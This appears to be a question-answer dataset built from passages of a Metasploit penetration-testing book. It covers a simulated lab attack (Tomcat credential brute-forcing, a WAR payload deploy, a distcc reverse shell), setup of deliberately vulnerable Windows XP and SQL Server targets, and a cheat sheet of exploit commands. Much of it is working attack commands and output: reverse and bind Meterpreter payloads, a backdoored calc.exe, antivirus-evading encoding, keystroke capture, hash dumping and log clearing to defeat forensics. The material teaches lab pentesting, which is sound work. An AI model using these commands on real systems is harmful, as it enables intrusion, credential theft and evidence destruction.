run\n[+] http://172.16.32.162:8180/manager/html [Apache-Coyote/1.1] [Tomcat Application Manager]\nsuccessful login 'tomcat' : 'tomcat'\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(tomcat_mgr_login) >\nOur brute force attack is successful, and it logs in with the username\ntomcat and password tomcat. But we don’t yet have a shell.\nWith our newly discovered credentials, we leverage Apache’s HTTP PUT\nfunctionality with the multi/http/tomcat_mgr_deploy exploit to place our pay-\nload on the system using the valid username and password that we discovered\nby brute-forcing the login.\nauxiliary(tomcat_mgr_login) > use multi/http/tomcat_mgr_deploy\nmsf exploit(tomcat_mgr_deploy) > set password tomcat\npassword => tomcat\nmsf exploit(tomcat_mgr_deploy) > set username tomcat\nusername => tomcat\nmsf exploit(tomcat_mgr_deploy) > set RHOST 172.16.32.162\nRHOST => 172.16.32.162\nmsf exploit(tomcat_mgr_deploy) > set LPORT 9999\nLPORT => 9999\nMsf exploit(tomcat_mgr_deploy) > set RPORT 8180\nRPORT => 8180\nmsf exploit(tomcat_mgr_deploy) > set payload linux/x86/shell_bind_tcp\npayload => linux/x86/shell_bind_tcp\nmsf exploit(tomcat_mgr_deploy) > exploit\n[*] Using manually select target \"Linux X86\"\n[*] Uploading 1669 bytes as FW36owipzcnHeUyIUaX.war ...\n[*] Started bind handler\nSimulated Penetration Test 261\n[*] Executing /FW36owipzcnHeUyIUaX/UGMIdfFjVENQOp4VveswTlma.jsp...\n[*] Undeploying FW36owipzcnHeUyIUaX ...\n[*] Command shell session 1 opened (172.16.32.129:43474 -> 172.16.32.162:9999) at 2010-05-\n21 23:57:47 -0400msf\nls\nbin\nboot\ncdrom\ndev\netc\nhome\ninitrd\ninitrd.img\nlib\nlost+found\nmedia\nmnt\nopt\nproc\nroot\nsbin\nsrv\nsys\ntmp\nusr\nvar\nvmlinuz\nwhoami\ntomcat55\nls /root\nreset_logs.sh\nmkdir /root/moo.txt\nmkdir: cannot create directory '/root/moo.txt': Permission denied\nNotice that we cannot write to the root folder, because we’re running\nfrom a limited user account and this folder requires root-level permissions.\nUsually, Apache runs under the Apache user account, which is sometimes\napache but which can also be httpd, www-data, among other names. Based on\nwhat we know about the operating system version in use on the target, we\ncould use local privilege escalation techniques to gain further access as root.\nBecause we already have some basic access, let’s try a couple of different attacks.\nNOTE Here’s a little hint in obtaining root access to Metasploitable, without privilege escalation:\nCheck out http://www.exploit-db.com/exploits/5720/ for the SSH predictable\nPRNG exploit.\nAttacking Obscure Services\nWhen we performed only the default nmap port scan, we did not include all\npossible ports. Because we have now gained initial access to the system, we\nenter netstat -antp, and we notice other ports that nmap did not scan for\n262 Chapter 17\nwhen performing the attack. (Remember that in a penetration test we can’t\nalways rely on the defaults to be successful.)\nOur scan finds that port 3632 is open and associated with DistCC. An\nonline search tells us that DistCC is a program that distributes builds of C/C++\ncode to several machines across a network, and it is vulnerable to an attack.\n(When performing penetration tests, you will often encounter unfamiliar\napplications and products, and you will need to research the application before\nyou can attack it.)\nmsf exploit(distcc_exec) > set payload linux/x86/shell_reverse_tcp\npayload => linux/x86/shell_reverse_tcp\nmsf exploit(distcc_exec) > set LHOST 172.16.32.129\nLHOST => 172.16.32.129\nshomsf exploit(distcc_exec) > set RHOST 172.16.32.162\nRHOST => 172.16.32.162\nmsf exploit(distcc_exec) > show payloads\nCompatible Payloads\n===================\nName Rank Description\n---- ---- -----------\ncmd/unix/bind_perl normal Unix Command Shell, Bind TCP (via perl)\ncmd/unix/bind_ruby normal Unix Command Shell, Bind TCP (via Ruby)\ncmd/unix/generic normal Unix Command, Generic command execution\ncmd/unix/reverse normal Unix Command Shell, Double reverse TCP (telnet)\ncmd/unix/reverse_perl normal Unix Command Shell, Reverse TCP (via perl)\ncmd/unix/reverse_ruby normal Unix Command Shell, Reverse TCP (via Ruby)\nmsf exploit(distcc_exec) > set payload cmd/unix/reverse\npayload => cmd/unix/reverse\nmsf exploit(distcc_exec) > exploit\n[*] Started reverse double handler\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo q6Td9oaTrOkXsBXS;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket A\n[*] A: \"q6Td9oaTrOkXsBXS\\r\\n\"\n[*] Matching...\n[*] B is input...\n[*] Command shell session 2 opened (172.16.32.129:4444 -> 172.16.32.162:47002) at 2010-05-\n22 00:08:04 -0400\nwhoami\ndaemon\nmkdir /root/moo\nmkdir: cannot create directory '/root/moo': Permission denied\nSimulated Penetration Test 263\nNotice above that we are still not at root. A local privilege exploit will\nfurther compromise the system and give full root access. We won’t tell you\nthe answer here; use what you’ve learned in this book to gain root privileges\nsuccessfully on the Metasploitable system. One hint is that you can find the\nexploit at Exploits Database (http://www.exploit-db.com/). Try getting a root\nLinux/Meterpreter shell on the system on your own.\nCovering Your Tracks\nHaving completed our attacks, our next step is to return to each exploited\nsystem to erase our tracks and clean up any mess we’ve left behind. Remnants\nof a Meterpreter shell or some other pieces of malware should be removed to\navoid exposing the system further. For example, when we used the PUT com-\nmand to compromise the Apache Tomcat instance, an attacker could use the\nexploit code left behind to compromise the system.\nSometimes, you will need to cover your tracks—for example, when test-\ning the forensics analysis of a compromised system or an incident response\nprogram. In such cases, your goal is to thwart any forensics analysis or IDS.\nIt’s often difficult to hide all your tracks, but you should be able to manipu-\nlate the system to confuse the examiner and make it almost impossible to\nidentify the extent of the attack.\nIn most cases, when forensics analysis is performed, if you can mangle\nthe system so that it renders the majority of the examiner’s work almost\nunreadable and inconclusive, he will most likely identify the system as having\nbeen infected or compromised and might not understand how much infor-\nmation you were able to extract from the system. The best way to thwart\nforensic analysis is to wipe the system completely and rebuild it, removing all\ntraces, but this is rare during a penetration test.\nOne benefit discussed in a number of chapters is the ability for Meter-\npreter to reside purely in memory. Often, you’ll find it challenging to detect\nand react to Meterpreter in memory space. Although research often suggests\nways to detect a Meterpreter payload, the Metasploit crew typically responds\nwith a new way to hide Meterpreter.\nThis is the same cat-and-mouse game that antivirus software vendors play\nwith new releases of Meterpreter. When a new encoder or method for obfus-\ncating a payload is released, vendors can take several months to detect the\nissues and update their product signatures to catch them. In most cases, it’s\nrelatively difficult for most forensics analysts to identify a purely memory-\nresident attack vector from Metasploit.\nWe won’t offer in-depth information about covering your tracks, but a cou-\nple of Metasploit features are worth mentioning: timestomp and event_manager.\nTimestomp is a Meterpreter plug-in that allows you to modify, erase, or set cer-\ntain attributes on files. Let’s run timestomp first:\nmeterpreter > timestomp\nUsage: timestomp file_path OPTIONS\n264 Chapter 17\nOPTIONS:\n-a <opt> Set the \"last accessed\" time of the file\n-b Set the MACE timestamps so that EnCase shows blanks\n-c <opt> Set the \"creation\" time of the file\n-e <opt> Set the \"mft entry modified\" time of the file\n-f <opt> Set the MACE of attributes equal to the supplied file\n-h Help banner\n-m <opt> Set the \"last written\" time of the file\n-r Set the MACE timestamps recursively on a directory\n-v Display the UTC MACE values of the file\n-z <opt> Set all four attributes (MACE) of the file\nmeterpreter > timestomp C:\\\\boot.ini -b\n[*] Blanking file MACE attributes on C:\\boot.ini\nmeterpreter >\nIn this example, we changed the timestamp so that when Encase (a popular\nforensics analysis tool) is used, the timestamps are blank.\nThe tool event_manager will modify event logs so that they don’t show any\ninformation that might reveal that an attack occurred. Here it is in action:\nmeterpreter > run event_manager\nMeterpreter Script for Windows Event Log Query and Clear.\nOPTIONS:\n-c <opt> Clear a given Event Log (or ALL if no argument specified)\n-f <opt> Event ID to filter events on\n-h Help menu\n-i Show information about Event Logs on the System and their configuration\n-l <opt> List a given Event Log.\n-p Supress printing filtered logs to screen\n-s <opt> Save logs to local CSV file, optionally specify alternate folder in which to\nsave logs\nmeterpreter > run event_manager -c\n[-] You must specify an eventlog to query!\n[*] Application:\n[*] Clearing Application\n[*] Event Log Application Cleared!\n[*] MailCarrier 2.0:\n[*] Clearing MailCarrier 2.0\n[*] Event Log MailCarrier 2.0 Cleared!\n[*] Security:\n[*] Clearing Security\n[*] Event Log Security Cleared!\n[*] System:\n[*] Clearing System\n[*] Event Log System Cleared!\nmeterpreter >\nSimulated Penetration Test 265\nIn this example, we clear all the event logs, but the examiner might notice\nother interesting things on the system that could alert him to an attack. In\ngeneral though, the examiner will not be able to piece together the puzzle to\nidentify what happened during the attack, but he will know that something\nbad had occurred.\nRemember to document your changes to a target system to make it easier\nto cover your tracks. Usually, you’ll leave a small sliver of information on\nthe system, so you might as well make it extremely difficult for the incident\nresponse and forensics analysis team to find it.\nWrapping Up\nHaving gotten this far, we could continue to attack other machines on the\ninternal network using Metasploit and Meterpreter, with our attacks limited\nonly by our creativity and ability. If this were a larger network, we could fur-\nther penetrate the network using information gathered from various systems\non the network.\nFor example, earlier in this chapter we compromised a Windows-based\nsystem. We could use the Meterpreter console to extract the hash values from\nthat system and then use those credentials to authenticate to other Windows-\nbased systems. The local administrator account is almost always the same from\none system to another, so even in a corporate environment, we could use the\ninformation from one system to bridge attacks to another.\nPenetration testing requires you to think outside the box and combine\npieces of a puzzle. We used one method during this chapter, but there are\nprobably several different ways to get into the systems and different avenues\nof attack you can leverage. This all comes with experience and spending the\ntime to become creative. Persistence is key to penetration testing.\nRemember to establish a fundamental set of methodologies you are com-\nfortable with, but change them as necessary. Often, penetration testers change\ntheir methodologies at least once per test to stay fresh. Changes might include\na new way of attacking a system or use of a new method. Regardless of the\nmethod you choose, remember that you can accomplish anything in this\nfield with a bit of experience and hard work.\n266 Chapter 17"
  },
  {
    "input": "What steps are required to set up a vulnerable Windows XP system and a SQL Server 2005 Express instance for use with the Metasploit Framework?",
    "summary": "This appendix explains how to set up a test environment using Back|Track, Ubuntu 9.04, Metasploitable, and Windows XP for practicing with the Metasploit Framework. It includes steps for configuring Linux virtual machines with static IP addresses and setting up a vulnerable Windows XP system with specific services disabled. Additionally, it details how to install and configure SQL Server 2005 Express for testing database-related exploits.",
    "output": "C O N F I G U R I N G Y O U R\nT A R G E T M A C H I N E S\nThe best way to learn to use the Metasploit Framework\nis by practicing—repeating a task until you fully under-\nstand how it is accomplished. This appendix explains\nhow to set up a test environment to use with the exam-\nples in this book.\nInstalling and Setting Up the System\nThe examples in this book use a combination of Back|Track, Ubuntu 9.04,\nMetasploitable, and Windows XP. Back|Track serves as our vehicle for exploi-\ntation, and the Ubuntu and Windows systems are our target systems.\nFirst create an unpatched Windows XP Service Pack 2 installation to test the\nexamples presented throughout this book. The Back|Track and Ubuntu 9.04\nvirtual machines can be run on a host machine running Windows, Mac OS X,\nor Linux on any VMware product, including Workstation, Server, Player,\nFusion, or ESX.\nNOTE Be careful with your Ubuntu and Windows XP virtual machines, because these systems\nare vulnerable and easy to exploit. Do not conduct any sensitive activities on these\nmachines: If you can exploit them, anyone else can, too.\nIf you don’t already have the free VMware Player for Windows and Linux,\ndownload and install it. If you’re using OS X, download the free 30-day trial\nof VMware Fusion. (If you’re running Windows, you can also use the free\nVMware Server edition.)\nAfter you have installed VMware, double-click the .vmx file to use with\nVMware, or open the virtual machine files in VMware Player by choosing\nFile(cid:23)Open and pointing to the folder that contains all the virtual machines\nand associated files. If you’re installing from an ISO disc image, create a new\nvirtual machine and specify this ISO file as the CD-ROM device.\nNOTE Download Back|Track from http://www.backtrack-linux.org/ and Ubuntu 9.04\nfrom http://www.vmware.com/appliances/directory/ by searching for Ubuntu\n9.04. Metasploitable can be downloaded from http://blog.metasploit.com/2010/\n05/introducing-metasploitable.html.\nBooting Up the Linux Virtual Machines\nAfter powering on either of the Linux virtual machines, you need to log in.\nThe default credentials for both Linux environments are username root and\npassword toor.\nIf you don’t have a DHCP server on your network, find your system’s\naddress range and use the commands shown in the following listing. (Make\nsure that you replace your IP address with an unused one, and edit the net-\nwork interface that you will be using. For more on manual network setup, see\nhttp://www.yolinux.com/TUTORIALS/LinuxTutorialNetworking.html.)\nroot@bt:~# nano /etc/network/interfaces\nPassword:\n<inside the nano editor place your valid information into the system>\n# The primary network interface\nauto eth0 # the interface used\niface eth0 inet static # configure static IP address\naddress 192.168.1.10 # your IP address you want\nnetmask 255.255.255.0 # your subnet mask\nnetwork 192.168.1.0 # your network address\nbroadcast 192.168.0.255 # your broadcast address\ngateway 192.168.1.1 # your default gateway\n<control-x>\n<y>\nAfter configuration is complete, your Linux environment should be\nready for use. Do not update the Ubuntu installation, because this system\nshould remain vulnerable.\n268 Appendix A\nSetting Up a Vulnerable Windows XP Installation\nTo run the examples in this book, you will need to install a licensed copy of\nWindows XP on a virtualization platform such as VMware. After you have\ncompleted the installation, log in as Administrator, open the Control Panel,\nswitch to Classic View, and choose Windows Firewall. Select Off and click OK.\n(This may seem unrealistic, but this scenario is more common than you might\nimagine in large corporations.)\nNext, open Automatic Updates and select Turn off Automatic Updates;\nthen click OK. You don’t want Windows to patch vulnerabilities as you’re\ntrying to learn how to exploit them.\nNow configure your installation with a static IP address via the Network\nConnections Control Panel. While not required, doing this will save you from\nhaving to recheck the target address every time you launch an exploit.\nConfiguring Your Web Server on Windows XP\nTo make things interesting and provide for a larger attack surface, we’ll\nenable some additional services.\n1. In the Control Panel, select Add or Remove Programs, and then select\nAdd/Remove Windows Components. You should be looking at the\nWindows Components Wizard.\n2. Select the checkbox for Internet Information Services (IIS) and click\nDetails. Then select the checkbox for File Transfer Protocol (FTP) Service\nand click OK. Conveniently enough, the FTP service allows anonymous\nconnections by default.\n3. Select the Management and Monitoring Tools checkbox and click OK.\nBy default, this installs the Simple Network Management Protocol (SNMP)\nand Windows Management Interface (WMI) SNMP Provider.\n4. Click Next to complete the installation and reboot the machine for good\nmeasure.\nThe combination of these steps adds different services that we test through-\nout this book. The IIS server will allow you to run a website and can be down-\nloaded from http://www.secmaniac.com/files/nostarch1.zip. The FTP service will\nallow you to perform FTP-based attacks against the Windows system, and the\nSNMP configuration will allow you to test auxiliary modules within Metasploit.\nBuilding a SQL Server\nMany database modules within Metasploit and Fast-Track target Microsoft\nSQL Server, so you need to install SQL Server 2005 Express, available for free\nfrom Microsoft. As of this writing, you can locate the non–service pack version\nof SQL Server Express at http://www.microsoft.com/. To install SQL Server\nExpress, you will need to install Windows Installer 3.1 and the .NET Frame-\nwork 2.0. You can find links to the resources on this page, and all other URLs\nreferenced in this book, at http://www.secmaniac.com/files/nostarch1.zip.\nConfiguring Your Target Machines 269\nOnce you have the prerequisites installed, run the SQL Express installer\nand select all the defaults except for Authentication Mode. Select Mixed Mode,\nset a sa login password of password1, and then continue with the installation.\nWith the basic installation of SQL Server complete, you need to make a\nfew more changes to make it accessible on your network:\n1. Select Start(cid:23)All Programs(cid:23)Microsoft SQL Server 2005(cid:23)Configuration\nTools, and then select SQL Server Configuration Manager.\n2. When the Configuration Manager starts, select SQL Server 2005 Services,\nright-click SQL Server (SQLEXPRESS), and select Stop.\n3. Expand SQL Server 2005 Network Configuration Manager and select\nProtocols for SQLEXPRESS, as shown in Figure A-1.\nFigure A-1: Protocols for SQLEXPRESS\n4. Double-click TCP/IP, and on the Protocol tab, set Enabled to Yes and\nListen All to No.\n5. Next, while still within the TCP/IP Properties dialog, select the IP Addresses\ntab and remove any entries under IPAll. Under IP1 and IP2, remove the\nvalues for TCP Dynamic Ports and set Active and Enabled for each of\nthem to Yes.\n6. Finally, set the IP1 IP Address to match your static IP address set earlier,\nset the IP2 address to 127.0.0.1, and set the TCP port for each of them\nto 1433. Your settings should look similar to those shown in Figure A-2.\nClick OK when you are all set.\nNext, you’ll need to enable the SQL Server Browser service:\n1. Select SQL Server 2005 Services and double-click SQL Server Browser.\n2. On the Service tab, set the Start Mode to Automatic.\n270 Appendix A\nFigure A-2: Setting SQL Server IP addresses in the TCP/IP\nProperties dialog\nBy default, the SQL Server runs under the low-privilege Network Service\naccount, which is a great default. However, it’s not entirely realistic for what\nwe find deployed in the field, and often administrators change this rather\nthan trying to troubleshoot permissions issues.\nOn most target systems, we have found that the SQL Server Browser\nservice is running as an elevated SYSTEM-based account. Most systems have\nthe SQL Server Service logged on as Local System, the default in older versions\nof Microsoft SQL Server (2000 and earlier). Therefore, you should change\nthe account by double-clicking SQL Server (SQLEXPRESS) and setting Log\non as to Local System. Click OK when you have finished. Then right-click\nSQL Server (SQLEXPRESS) and select Start. Do the same with SQL Server\nbrowser.\nFinally, close the Configuration Manager and verify that everything is\nworking properly by opening a command prompt and running netstat -ano\n|find \"1433\" and netstat -ano |find \"1434\". Your IP addresses configured earlier\nshould be listening on TCP port 1433 and UDP port 1434, as shown here:\nMicrosoft Windows XP [Version 5.1.2600]\n© Copyright 1985-2001 Microsoft Corp.\nC:\\Documents and Settings\\Administrator>netstat -ano |find \"1433\"\nTCP 127.0.0.1:1433 0.0.0.0:0 LISTENING 512\nTCP 192.168.1.155:1433 0.0.0.0:0 LISTENING 512\nC:\\Documents and Settings\\Administrator>netstat -ano |find \"1434\"\nUDP 0.0.0:1434 *:*\nC:\\Documents and Settings\\Administrator>\nConfiguring Your Target Machines 271\nCreating a Vulnerable Web Application\nTo use some of the more advanced features of Metasploit and external tools\nsuch as Fast-Track and the Social-Engineer Toolkit (SET), you will need a\nvulnerable web application to test against. To create the database and tables,\ndownload and install SQL Server Management Studio Express from the link\nprovided at http://www.nostarch.com/metasploit.htm.\nAfter the installation and a healthy reboot, do the following:\n1. Start the application by choosing Start(cid:23)All Programs(cid:23)Microsoft SQL\nServer 2005(cid:23)SQL Server Management Studio Express.\n2. When prompted for credentials, select SQL Server Authentication from\nthe Authentication drop-down, and log in using the username sa and the\npassword password1.\n3. In Object Explorer, right-click Databases and select New Database.\n4. For the Database name, enter WebApp and click OK.\n5. Expand Databases and the WebApp database tree.\n6. Right-click Tables and select New Table. Name your new table users with\nthe column names and types shown in Figure A-3.\nFigure A-3: Users table columns\n7. Save the users table, and then right-click it and select Open Table.\n8. Populate the table with some sample data similar to that shown in\nFigureA-4, and then save your work.\nFigure A-4: Populated users table\n9. Expand the Security tree under Object Explorer, and then expand Logins.\n10. Right-click Logins in the User Properties window and select New Login.\nIn the Login-New window, click Search, enter ASPNET, and then click\nCheck Names. The full username should automatically populate. Click\nOK to exit the user search.\n11. Finally, while still in the User Properties window, select User Mapping,\nselect the check box next to WebApp, select the db_owner role member-\nship, and then click OK.\n272 Appendix A"
  },
  {
    "input": "What steps are required to set up and test a vulnerable web application that interacts with a database?",
    "summary": "The text explains how to configure the SQL backend for a web application and then create a website to test it. It outlines steps to download and set up the web app, test SQL injection vulnerabilities, and ensure the testing environment is properly updated with the latest versions of Back|Track, Metasploit, SET, and Fast-Track.",
    "output": "That takes care of the entire configuration required on the SQL backend\nfor the web application. Save and exit Management Studio.\nAll that remains is to create the website to interact with the database you\ncreated. Let’s do that now:\n1. Download the vulnerable web application from http://www.nostarch.com/\nmetasploit.htm and extract the contents of the archive to C:\\Inetpub\\wwwroot\\.\n2. Open your browser and point to http://<youripaddress>/Default.aspx. You\nshould see a log-in form, as shown in Figure A-5.\n3. Enter bogus credentials to verify that the SQL query is being executed\nproperly. To test some basic SQL injection to identify whether the web\napplication is functioning properly, enter a single quote (') in the user-\nname field, and enter anything as the password (doesn’t matter). The\napplication should produce a yellow page with a SQL-related error.\n4. Click the back arrow on your browser and enter OR 1=1-- and something\n(doesn’t matter) in the password field. You should see a “You have success-\nfully logged on” message.\nIf you have gotten this far, everything is set up properly, and you are\nready to plunge in.\nFigure A-5: Sample attack website\nUpdating Back|Track\nAs with any operating system, make sure you’re running the latest version of\nBack|Track and its tools. When logging into Back|Track (root/toor), issue the\nfollowing commands:\nroot@bt:~# apt-get update && apt-get upgrade && apt-get dist-upgrade\nConfiguring Your Target Machines 273\nThis sequence of commands will select all available updates within\nBack|Track. After you have updated Back|Track by entering y (for yes) when\nprompted to accept the SVN certificate, your system still needs some minor\nupdates to Metasploit, Fast-Track, and the SET.\n(cid:88) root@bt:~# cd /opt/framework3/msf3/\n(cid:89) root@bt:/opt/framework3/msf3# msfupdate\n. . . SNIP . . .\nUpdated to revision XXXX.\n(cid:90) root@bt:/opt/framework3/msf3# cd /pentest/exploits/set/\nroot@bt:/pentest/exploits/set# svn update\n. . . SNIP . . .\nUpdated to revision XXXX.\n(cid:91) root@bt:/pentest/exploits/set# cd /pentest/exploits/fasttrack/\nroot@bt:/pentest/exploits/fasttrack# svn update\n. . . SNIP . . .\nAt revision XXXX.\nroot@bt:/pentest/exploits/fasttrack#\nIn Back|Track, Metasploit is located at /opt/framework3/msf3/ (cid:88), so\nchange to that directory prior to updating the Framework via subversion\nwith msfupdate (cid:89).\nOnce Metasploit is updated, change to /pentest/exploits/set/ (cid:90) and run svn\nupdate. Lastly, change to /pentest/exploits/fasttrack/ (cid:91) and update Fast-Track.\nYou have now created and updated the testing environment that you will\nuse as you work through the examples in this book.\n274 Appendix A"
  },
  {
    "input": "What are the key commands and their purposes in Metasploit's MSFconsole and Meterpreter interfaces?",
    "summary": "This cheat sheet provides an overview of commonly used commands in Metasploit, including how to search for exploits, set parameters, and execute attacks. It also covers Meterpreter commands for post-exploitation tasks like system information gathering, process management, and privilege escalation. Key functions include listing sessions, managing tokens, and performing network sniffing and file manipulation.",
    "output": "C H E A T S H E E T\nHere is a reference for the most frequently used com-\nmands and syntax within Metasploit’s various interfaces\nand utilities. See “Meterpreter Post Exploitation Com-\nmands” on page 282 for some all-in-one commands\nthat will make your life easier.\nMSFconsole Commands\nshow exploits\nShow all exploits within the Framework.\nshow payloads\nShow all payloads within the Framework.\nshow auxiliary\nShow all auxiliary modules within the Framework.\nsearch name\nSearch for exploits or modules within the Framework.\ninfo\nLoad information about a specific exploit or module.\nuse name\nLoad an exploit or module (example: use windows/smb/psexec).\nLHOST\nYour local host’s IP address reachable by the target, often the public IP\naddress when not on a local network. Typically used for reverse shells.\nRHOST\nThe remote host or the target.\nset function\nSet a specific value (for example, LHOST or RHOST).\nsetg function\nSet a specific value globally (for example, LHOST or RHOST).\nshow options\nShow the options available for a module or exploit.\nshow targets\nShow the platforms supported by the exploit.\nset target num\nSpecify a specific target index if you know the OS and service pack.\nset payload payload\nSpecify the payload to use.\nshow advanced\nShow advanced options.\nset autorunscript migrate -f\nAutomatically migrate to a separate process upon exploit completion.\ncheck\nDetermine whether a target is vulnerable to an attack.\nexploit\nExecute the module or exploit and attack the target.\nexploit -j\nRun the exploit under the context of the job. (This will run the exploit\nin the background.)\nexploit -z\nDo not interact with the session after successful exploitation.\nexploit -e encoder\nSpecify the payload encoder to use (example: exploit –e shikata_ga_nai).\nexploit -h\nDisplay help for the exploit command.\nsessions -l\nList available sessions (used when handling multiple shells).\n276 Appendix B\nsessions -l -v\nList all available sessions and show verbose fields, such as which vulnera-\nbility was used when exploiting the system.\nsessions -s script\nRun a specific Meterpreter script on all Meterpreter live sessions.\nsessions -K\nKill all live sessions.\nsessions -c cmd\nExecute a command on all live Meterpreter sessions.\nsessions -u sessionID\nUpgrade a normal Win32 shell to a Meterpreter console.\ndb_create name\nCreate a database to use with database-driven attacks (example: db_create\nautopwn).\ndb_connect name\nCreate and connect to a database for driven attacks (example: db_connect\nautopwn).\ndb_nmap\nUse nmap and place results in database. (Normal nmap syntax is supported,\nsuch as –sT –v –P0.)\ndb_autopwn -h\nDisplay help for using db_autopwn.\ndb_autopwn -p -r -e\nRun db_autopwn against all ports found, use a reverse shell, and exploit all\nsystems.\ndb_destroy\nDelete the current database.\ndb_destroy user:password@host:port/database\nDelete database using advanced options.\nMeterpreter Commands\nhelp\nOpen Meterpreter usage help.\nrun scriptname\nRun Meterpreter-based scripts; for a full list check the scripts/meterpreter\ndirectory.\nsysinfo\nShow the system information on the compromised target.\nls\nList the files and folders on the target.\nCheat Sheet 277\nuse priv\nLoad the privilege extension for extended Meterpreter libraries.\nps\nShow all running processes and which accounts are associated with each\nprocess.\nmigrate PID\nMigrate to the specific process ID (PID is the target process ID gained\nfrom the ps command).\nuse incognito\nLoad incognito functions. (Used for token stealing and impersonation on\na target machine.)\nlist_tokens -u\nList available tokens on the target by user.\nlist_tokens -g\nList available tokens on the target by group.\nimpersonate_token DOMAIN_NAME\\\\USERNAME\nImpersonate a token available on the target.\nsteal_token PID\nSteal the tokens available for a given process and impersonate that token.\ndrop_token\nStop impersonating the current token.\ngetsystem\nAttempt to elevate permissions to SYSTEM-level access through multiple\nattack vectors.\nshell\nDrop into an interactive shell with all available tokens.\nexecute -f cmd.exe -i\nExecute cmd.exe and interact with it.\nexecute -f cmd.exe -i -t\nExecute cmd.exe with all available tokens.\nexecute -f cmd.exe -i -H -t\nExecute cmd.exe with all available tokens and make it a hidden process.\nrev2self\nRevert back to the original user you used to compromise the target.\nreg command\nInteract, create, delete, query, set, and much more in the target’s registry.\nsetdesktop number\nSwitch to a different screen based on who is logged in.\nscreenshot\nTake a screenshot of the target’s screen.\n278 Appendix B\nupload file\nUpload a file to the target.\ndownload file\nDownload a file from the target.\nkeyscan_start\nStart sniffing keystrokes on the remote target.\nkeyscan_dump\nDump the remote keys captured on the target.\nkeyscan_stop\nStop sniffing keystrokes on the remote target.\ngetprivs\nGet as many privileges as possible on the target.\nuictl enable keyboard/mouse\nTake control of the keyboard and/or mouse.\nbackground\nRun your current Meterpreter shell in the background.\nhashdump\nDump all hashes on the target.\nuse sniffer\nLoad the sniffer module.\nsniffer_interfaces\nList the available interfaces on the target.\nsniffer_dump interfaceID pcapname\nStart sniffing on the remote target.\nsniffer_start interfaceID packet-buffer\nStart sniffing with a specific range for a packet buffer.\nsniffer_stats interfaceID\nGrab statistical information from the interface you are sniffing.\nsniffer_stop interfaceID\nStop the sniffer.\nadd_user username password -h ip\nAdd a user on the remote target.\nadd_group_user \"Domain Admins\" username -h ip\nAdd a username to the Domain Administrators group on the remote target.\nclearev\nClear the event log on the target machine.\ntimestomp\nChange file attributes, such as creation date (antiforensics measure).\nreboot\nReboot the target machine.\nCheat Sheet 279"
  },
  {
    "input": "What are the commands used to generate and encode payloads in Metasploit?",
    "summary": "The text explains commands for generating and encoding payloads using Metasploit. `msfpayload` is used to create payloads like reverse_tcp or bind_tcp, and can export them in various formats such as EXE, C, Java, or raw. `msfencode` is then used to encode these payloads, allowing for multiple encodings and different output formats like EXE or C. The commands demonstrate how to generate, encode, and save payloads for use in exploitation scenarios.",
    "output": "MSFpayload Commands\nmsfpayload -h\nList available payloads.\nmsfpayload windows/meterpreter/bind_tcp O\nList available options for the windows/meterpreter/bind_tcp payload (all of\nthese can use any payload).\nmsfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 X >\npayload.exe\nCreate a Meterpreter reverse_tcp payload to connect back to192.168.1.5\nand on port 443, and then save it as a Windows Portable Executable\nnamed payload.exe.\nmsfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R >\npayload.raw\nSame as above, but export as raw format. This will be used later in\nmsfencode.\nmsfpayload windows/meterpreter/bind_tcp LPORT=443 C > payload.c\nSame as above but export as C-formatted shellcode.\nmsfpayload windows/meterpreter/bind_tcp LPORT=443 J > payload.java\nExport as %u encoded JavaScript.\nMSFencode Commands\nmsfencode -h\nDisplay the msfencode help.\nmsfencode -l\nList the available encoders.\nmsfencode -t (c, elf, exe, java, js_le, js_be, perl, raw, ruby, vba, vbs,\nloop-vbs, asp, war, macho)\nFormat to display the encoded buffer.\nmsfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5\n-t exe\nEncode payload.raw with shikata_ga_nai five times and export it to an\noutput file named encoded_payload.exe.\nmsfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -e x86/\n_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o\nmulti-encoded_payload.exe\nCreate a multi-encoded payload.\nmsfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c\nCreate pure alphanumeric shellcode where ESI points to the shellcode;\noutput in C-style notation.\n280 Appendix B"
  },
  {
    "input": "What are the key commands and methods for creating and launching a Meterpreter payload using MSFcli and MSFvenom?",
    "summary": "The text explains how to use MSFcli and MSFvenom to create and launch payloads for exploitation. It details commands for launching specific exploits, generating reverse and bind TCP Meterpreter payloads, and encoding them for use. MSFvenom is presented as a more efficient tool for creating and encoding payloads in one step.",
    "output": "MSFcli Commands\nmsfcli | grep exploit\nShow only exploits.\nmsfcli | grep exploit/windows\nShow only Windows exploits.\nmsfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp\nLPORT=443 RHOST=172.16.32.142 E\nLaunch ms08_067_netapi exploit at 172.16.32.142 with a bind_tcp payload\nbeing delivered to listen on port443.\nMSF, Ninja, Fu\nmsfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R |\nmsfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe\nCreate a reverse Meterpreter payload connecting back to 192.168.1.5\non port 443 using calc.exe as a template to backdoor. Keep execution\nflow within the application for it to continue to work, and output the\nshikata_ga_nai encoded payload to payload.exe.\nmsfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R |\nmsfencode -x calc.exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe\nCreate a reverse Meterpreter payload connecting back to 192.168.1.5 on\nport 443 using calc.exe as a template to backdoor. Does not keep execu-\ntion flow within the application and will not prompt anything back to the\nend user when it is executed. This is useful when you have remote access\nvia a browser exploit and don’t want the calculator application popping\nup to the end user. Also outputs the shikata_ga_nai encoded payload to\npayload.exe.\nmsfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe\n-e x86/shikata_ga_nai -c 7 -t exe && msfcli multi/handler PAYLOAD=windows/\nmeterpreter/bind_tcp LPORT=443 E\nCreate a bind_tcp Meterpreter payload in raw format, encode it seven\ntimes using shikata_ga_nai, output it in Windows portable executable 